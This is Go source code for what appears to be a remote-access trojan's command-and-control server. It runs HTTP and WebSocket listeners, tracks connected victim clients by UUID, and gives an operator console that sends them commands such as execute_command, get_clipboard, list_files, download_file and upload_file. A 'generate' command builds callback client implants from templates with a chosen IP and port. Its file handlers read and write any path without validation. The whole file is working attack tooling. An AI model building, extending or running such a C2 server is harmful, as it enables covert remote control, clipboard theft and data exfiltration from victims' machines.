package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

type Client struct {
	Conn         *websocket.Conn
	UUID         string
	Addr         string
	ResponseChan chan string
}

type ClientManager struct {
	HTTPClients               map[string]*Client
	WebSocketClients          map[string]*Client
	mu                        sync.RWMutex
	addHTTPClientChan         chan *Client
	removeHTTPClientChan      chan string
	addWebSocketClientChan    chan *Client
	removeWebSocketClientChan chan string
	messageChan               chan Message
}

type Message struct {
	UUID    string
	Content string
}

func IsValidIP(ip string) bool {
	return net.ParseIP(ip) != nil
}

func IsValidPort(port string) bool {
	p, err := strconv.Atoi(port)
	return err == nil && p > 0 && p < 65536
}

func PrintUseCommandHelp() {
	var availableCommands = []string{
		"list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes", "help",
	}
	color.Set(color.FgCyan)
	fmt.Println("Available commands:")
	for _, cmd := range availableCommands {
		fmt.Printf("  %s\n", cmd)
	}
	color.Unset()
}

func PrintHelp() {
	color.Set(color.FgCyan)
	fmt.Println("Available commands:")
	fmt.Println("  http            Start HTTP server")
	fmt.Println("  websocket       Start WebSocket server")
	fmt.Println("  list websocket  List all active WebSocket connections")
	fmt.Println("  use <UUID>      Interact with a specific WebSocket connection (by UUID)")
	fmt.Println("  generate        Generate a client template with options: lang=<go|python> ip=<IP_ADDRESS> port=<PORT> protocol=<ws|wss>")
	fmt.Println("  help            Show this help information")
	color.Unset()
}

func NewClientManager() *ClientManager {
	return &ClientManager{
		HTTPClients:               make(map[string]*Client),
		WebSocketClients:          make(map[string]*Client),
		addHTTPClientChan:         make(chan *Client, 100),
		removeHTTPClientChan:      make(chan string, 100),
		addWebSocketClientChan:    make(chan *Client, 100),
		removeWebSocketClientChan: make(chan string, 100),
		messageChan:               make(chan Message, 100),
	}
}

func (cm *ClientManager) Start() {
	for {
		select {
		case client := <-cm.addHTTPClientChan:
			cm.mu.Lock()
			_, exists := cm.HTTPClients[client.UUID]
			cm.mu.Unlock()
			if !exists {
				fmt.Printf("New HTTP connection: %s, UUID: %s\n", client.Addr, client.UUID)
			}

		case uuid := <-cm.removeHTTPClientChan:
			cm.mu.Lock()
			delete(cm.HTTPClients, uuid)
			cm.mu.Unlock()
			fmt.Printf("HTTP connection closed: UUID: %s\n", uuid)

		case client := <-cm.addWebSocketClientChan:
			cm.mu.Lock()
			cm.WebSocketClients[client.UUID] = client
			cm.mu.Unlock()
			fmt.Printf("New WebSocket connection: %s, UUID: %s\n", client.Addr, client.UUID)

		case uuid := <-cm.removeWebSocketClientChan:
			cm.mu.Lock()
			delete(cm.WebSocketClients, uuid)
			cm.mu.Unlock()
			fmt.Printf("WebSocket connection closed: UUID: %s\n", uuid)

		case msg := <-cm.messageChan:
			cm.mu.RLock()
			if client, exists := cm.WebSocketClients[msg.UUID]; exists {
				response := map[string]string{"command": msg.Content}
				data, _ := json.Marshal(response)
				if err := client.Conn.WriteMessage(websocket.TextMessage, data); err != nil {
					fmt.Printf("Failed to send WebSocket message: %v\n", err)
				} else {
					fmt.Printf("WebSocket message sent to UUID: %s, Content: %s\n", msg.UUID, msg.Content)
				}
			} else if client, exists := cm.HTTPClients[msg.UUID]; exists {
				response := map[string]string{"command": msg.Content}
				jsonResponse, err := json.Marshal(response)
				if err != nil {
					fmt.Printf("Failed to marshal response to JSON: %v\n", err)
				}
				client.ResponseChan <- string(jsonResponse)
				fmt.Printf("HTTP message queued for UUID: %s, Content: %s\n", msg.UUID, msg.Content)
			} else {
				fmt.Printf("Connection not found: %s\n", msg.UUID)
			}
			cm.mu.RUnlock()
		}
	}
}

func handleFileUpload(w http.ResponseWriter, r *http.Request) {
	err := r.ParseMultipartForm(10 << 20) // 10 MB limit
	if err != nil {
		http.Error(w, "Error parsing form", http.StatusInternalServerError)
		return
	}

	file, handler, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Error retrieving file", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	fmt.Printf("Uploaded file: %s, size: %d bytes\n", handler.Filename, handler.Size)

	dst, err := os.Create(handler.Filename)
	if err != nil {
		http.Error(w, "Error saving file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	_, err = io.Copy(dst, file)
	if err != nil {
		http.Error(w, "Error writing file", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("File uploaded successfully"))
}

func handleFileDownload(w http.ResponseWriter, r *http.Request) {
	fileName := r.URL.Query().Get("filename")
	if fileName == "" {
		http.Error(w, "Filename is required", http.StatusBadRequest)
		return
	}

	file, err := os.Open(fileName)
	if err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}
	defer file.Close()

	w.Header().Set("Content-Disposition", "attachment; filename="+fileName)
	w.Header().Set("Content-Type", "application/octet-stream")
	io.Copy(w, file)
}

func httpHandler(cm *ClientManager, w http.ResponseWriter, r *http.Request) {
	uuid := r.Header.Get("UUID")
	if uuid == "" {
		http.Error(w, "UUID is required", http.StatusBadRequest)
		return
	}

	cm.mu.Lock()
	client, exists := cm.HTTPClients[uuid]
	if !exists {
		client = &Client{
			UUID:         uuid,
			Addr:         r.RemoteAddr,
			ResponseChan: make(chan string),
		}
		cm.HTTPClients[uuid] = client
	}
	cm.addHTTPClientChan <- client
	cm.mu.Unlock()
	if r.Method == http.MethodPost {

		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Failed to read request body", http.StatusInternalServerError)
			return
		}
		defer r.Body.Close()
		message := string(body)
		fmt.Printf("Received message from %s: %s\n", r.RemoteAddr, message)
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("Message received"))
		return
	}

	select {
	case response := <-client.ResponseChan:
		w.WriteHeader(http.StatusOK)
		res := map[string]string{"command": response}
		jsonResponse, err := json.Marshal(res)
		if err != nil {
			fmt.Printf("Failed to marshal response to JSON: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		w.Write([]byte(string(jsonResponse)))

	case <-time.After(30 * time.Second):
		res := map[string]string{"message": "StatusGatewayTimeout"}
		jsonResponse, _ := json.Marshal(res)
		http.Error(w, string(jsonResponse), http.StatusGatewayTimeout)
	}
}

func saveFile(filename string, data []byte) error {
	err := os.WriteFile(filename, data, 0644)
	if err != nil {
		fmt.Printf("Error saving file: %v\n", err)
		return err
	}
	fmt.Printf("File saved successfully: %s\n", filename)
	return nil
}

func wsHandler(cm *ClientManager, conn *websocket.Conn) {
	defer conn.Close()

	address := conn.RemoteAddr().String()
	newUUID := uuid.New().String()
	client := &Client{Conn: conn, UUID: newUUID, Addr: address}

	cm.addWebSocketClientChan <- client
	successMessage := map[string]string{"status": "success", "message": "Connection successful", "uuid": newUUID}
	data, _ := json.Marshal(successMessage)
	conn.WriteMessage(websocket.TextMessage, data)
	for {
		messageType, message, err := conn.ReadMessage()
		if err != nil {
			cm.removeWebSocketClientChan <- newUUID
			break
		}
		if messageType == websocket.TextMessage {
			fmt.Printf("Received message from %s: %s\n", address, message)
		} else if messageType == websocket.BinaryMessage {
			fmt.Printf("Received binary data from %s, saving to file...\n", address)
			saveFile("uploaded_file.bin", message)
			conn.WriteMessage(websocket.TextMessage, []byte("File uploaded successfully"))
		}
		fmt.Printf("Received message from %s: %s\n", address, message)
	}
}

func listClients(cm *ClientManager, protocol string) []string {
	cm.mu.RLock()
	defer cm.mu.RUnlock()

	var clients map[string]*Client
	if protocol == "http" {
		clients = cm.HTTPClients
	} else if protocol == "websocket" {
		clients = cm.WebSocketClients
	} else {
		clients = nil
	}

	var uuids []string
	if protocol == "all" {
		for uuid := range cm.HTTPClients {
			uuids = append(uuids, uuid)
		}
		for uuid := range cm.WebSocketClients {
			uuids = append(uuids, uuid)
		}
	} else {
		for uuid := range clients {
			uuids = append(uuids, uuid)
		}
	}
	return uuids
}

func sendMessageToClient(cm *ClientManager, uuid, message string) {
	cm.messageChan <- Message{UUID: uuid, Content: message}
}

func generateClientTemplate(language, ip, port, protocol string) error {
	var fileExt string
	switch language {
	case "go":
		fileExt = "go"
	case "python":
		fileExt = "py"
	default:
		return fmt.Errorf("unsupported language: %s", language)
	}

	templatePath := fmt.Sprintf("client/%s/%s_client.%s", language, protocol, fileExt)

	content, err := os.ReadFile(templatePath)
	if err != nil {
		return fmt.Errorf("failed to read template file: %v", err)
	}

	template := string(content)
	template = strings.ReplaceAll(template, "{ip}", ip)
	template = strings.ReplaceAll(template, "{port}", port)

	filename := fmt.Sprintf("client_%s.%s", language, fileExt)
	err = os.WriteFile(filename, []byte(template), 0644)
	if err != nil {
		return fmt.Errorf("failed to write client file: %v", err)
	}

	fmt.Printf("Client template generated: %s\n", filename)
	return nil
}

func handleGenerateCommand(params []string) {
	if len(params) == 0 {
		fmt.Println("Usage: generate lang=<go|python> ip=<IP_ADDRESS> port=<PORT> protocol=<ws|wss|http>")
		return
	}

	language := "go"
	ip := "127.0.0.1"
	port := "8081"
	protocol := "ws"
	for i := 0; i < len(params); i++ {
		part := params[i]
		if strings.HasPrefix(part, "--") {
			key := strings.TrimPrefix(part, "--")
			if i+1 < len(params) && !strings.HasPrefix(params[i+1], "--") {
				value := params[i+1]
				i++
				switch key {
				case "lang":
					if value != "go" && value != "python" && value != "electron" {
						fmt.Printf("Invalid language: %s. Supported languages are 'go' or 'python' or 'electron'.\n", value)
						return
					}
					language = value
				case "ip":
					if !IsValidIP(value) {
						fmt.Printf("Invalid IP address: %s\n", value)
						return
					}
					ip = value
				case "port":
					if !IsValidPort(value) {
						fmt.Printf("Invalid port: %s. Port must be a number between 1 and 65535.\n", value)
						return
					}
					port = value
				case "protocol":
					protocol = value
				default:
					fmt.Printf("Unknown parameter: --%s\n", key)
					return
				}
			} else {
				fmt.Printf("Missing value for parameter: --%s\n", key)
				return
			}
		}
	}
	if language == "" || ip == "" || port == "" || protocol == "" {
		fmt.Println("Missing one or more required parameters.")
		return
	}

	err := generateClientTemplate(language, ip, port, protocol)
	if err != nil {
		fmt.Printf("Error generating client: %v\n", err)
	}
}

func handleUseCommand(cm *ClientManager, uuid string) {
	cm.mu.RLock()
	var client *Client
	var exists bool
	if cm.HTTPClients[uuid] != nil {
		client, exists = cm.HTTPClients[uuid]
	} else if cm.WebSocketClients[uuid] != nil {
		client, exists = cm.WebSocketClients[uuid]
	} else {
		fmt.Printf("No Client to use \n")
		return
	}
	cm.mu.RUnlock()
	if !exists {
		color.Set(color.FgRed)
		fmt.Println("Connection not found1")
		color.Unset()
		return
	}

	config := readline.Config{
		Prompt: fmt.Sprintf("Enter message for %s (or 'back' to return): ", uuid),
		AutoComplete: readline.NewPrefixCompleter(
			readline.PcItem("list_files"),
			readline.PcItem("get_clipboard"),
			readline.PcItem("download_file"),
			readline.PcItem("upload_file"),
			readline.PcItem("execute_command"),
			readline.PcItem("list_processes"),
			readline.PcItem("help"),
		),
	}
	rl, err := readline.NewEx(&config)
	if err != nil {
		fmt.Println("Failed to initialize readline:", err)
		return
	}
	defer rl.Close()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}

		message := strings.TrimSpace(line)

		if message == "back" || message == "bk" {
			break
		}

		switch message {
		case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes":
			if client.Conn != nil {
				sendMessageToClient(cm, uuid, message)
			} else if client.ResponseChan != nil {
				select {
				case client.ResponseChan <- message:
					fmt.Printf("Command sent to HTTP client UUID %s: %s\n", uuid, message)
				default:
					fmt.Printf("HTTP client UUID %s is not waiting for a response\n", uuid)
				}
			} else {
				fmt.Printf("Client UUID %s has no active connection\n", uuid)
			}
		case "help":
			PrintUseCommandHelp()
		default:
			if client.Conn != nil {
				sendMessageToClient(cm, uuid, message)
			} else if client.ResponseChan != nil {
				select {
				case client.ResponseChan <- message:
					fmt.Printf("Command sent to HTTP client UUID %s: %s\n", uuid, message)
				default:
					fmt.Printf("HTTP client UUID %s is not waiting for a response\n", uuid)
				}
			} else {
				fmt.Printf("Client UUID %s has no active connection\n", uuid)
			}
		}
	}
}

func main() {
	cm := NewClientManager()
	go cm.Start()
	config := readline.Config{
		Prompt:       "Enter command: ",
		HistoryFile:  ".readline.tmp",
		AutoComplete: readline.NewPrefixCompleter(),
	}
	rl, err := readline.NewEx(&config)
	if err != nil {
		fmt.Println("Failed to initialize readline:", err)
		return
	}
	defer rl.Close()

	go func() {
		for {
			uuids := listClients(cm, "all")
			var completers []readline.PrefixCompleterInterface
			for _, uuid := range uuids {
				completers = append(completers, readline.PcItem(uuid))
			}
			rl.Config.AutoComplete = readline.NewPrefixCompleter(
				readline.PcItem("http"),
				readline.PcItem("websocket"),
				readline.PcItem("list", readline.PcItem("http"), readline.PcItem("websocket"), readline.PcItem("all")),
				readline.PcItem("use", completers...),
				readline.PcItem("generate",
					readline.PcItem("--ip 127.0.0.1 --port 8081 --lang go --protocol ws"),
					readline.PcItem("--ip 127.0.0.1 --port 8080 --lang go --protocol http"),
					readline.PcItem("--ip 127.0.0.1 --port 8081 --lang python --protocol ws"),
					readline.PcItem("--ip 127.0.0.1 --port 8080 --lang python --protocol http"),
					readline.PcItem("--ip 127.0.0.1 --port 8081 --lang electron --protocol ws"),
				),
				readline.PcItem("help"),
			)
		}
	}()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}

		command := strings.Fields(line)
		if len(command) == 0 {
			continue
		}

		switch command[0] {
		case "use":
			if len(command) > 1 {
				handleUseCommand(cm, command[1])
			} else {
				fmt.Println("Usage: use <UUID>")
			}
		case "http":
			http.HandleFunc("/client", func(w http.ResponseWriter, r *http.Request) {
				httpHandler(cm, w, r)
			})
			http.HandleFunc("/client/upload", handleFileUpload)
			http.HandleFunc("/client/download", handleFileDownload)
			go http.ListenAndServe(":8080", nil)
			color.Set(color.FgYellow)
			fmt.Println("HTTP server started on port 8080")
			color.Unset()
		case "websocket":
			http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
				upgrader := websocket.Upgrader{}
				upgrader.CheckOrigin = func(r *http.Request) bool { return true }
				conn, err := upgrader.Upgrade(w, r, nil)
				if err != nil {
					fmt.Println("Failed to upgrade to WebSocket:", err)
					return
				}
				wsHandler(cm, conn)
			})
			go http.ListenAndServe(":8081", nil)
			color.Set(color.FgYellow)
			fmt.Println("WebSocket server started on port 8081")
			color.Unset()
		case "list":
			if len(command) > 1 && command[1] == "websocket" {
				uuids := listClients(cm, "websocket")
				fmt.Println("Active WebSocket sessions:")
				for _, uuid := range uuids {
					fmt.Println("UUID:", uuid)
				}
			} else if len(command) > 1 && command[1] == "http" {
				uuids := listClients(cm, "http")
				fmt.Println("Active http sessions:")
				for _, uuid := range uuids {
					fmt.Println("UUID:", uuid)
				}
			} else if len(command) > 1 && command[1] == "all" {
				uuids_http := listClients(cm, "http")
				fmt.Println("All sessions:")
				for _, uuid := range uuids_http {
					fmt.Println("UUID:", uuid)
				}
				uuids_websocket := listClients(cm, "websocket")
				for _, uuid := range uuids_websocket {
					fmt.Println("UUID:", uuid)
				}
			} else {
				fmt.Println("Usage: list websocket")
			}
		case "generate":
			handleGenerateCommand(command[1:])
		case "help":
			PrintHelp()
		default:
			color.Set(color.FgRed)
			fmt.Println("Invalid command, please try again.")
			color.Unset()
		}
	}
}
